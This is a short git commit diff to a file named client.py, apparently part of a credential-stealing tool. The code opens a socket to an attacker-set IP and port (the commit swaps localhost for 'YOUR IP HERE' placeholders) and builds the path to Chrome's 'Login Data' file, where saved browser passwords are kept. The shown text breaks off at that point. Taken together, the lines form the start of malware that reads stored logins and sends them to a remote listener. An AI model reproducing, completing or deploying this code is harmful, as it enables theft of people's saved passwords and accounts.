1b9fdf848f33d18011ed4063e061a071adb6d35a
loopdee43 <90978974+loopdee43@users.noreply.github.com>
2022-05-09 12:25:07 -0400

    Update client.py

--- client.py
+++ client.py
@@ -1,7 +1,7 @@
 import socket
 import os
-IP_ADDR = "127.0.0.1"
-PORT = 1234
+IP_ADDR = "YOUR IP HERE"
+PORT = YOUR PORT HERE
 s = socket.socket()
 s.connect((IP_ADDR, PORT))
 db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
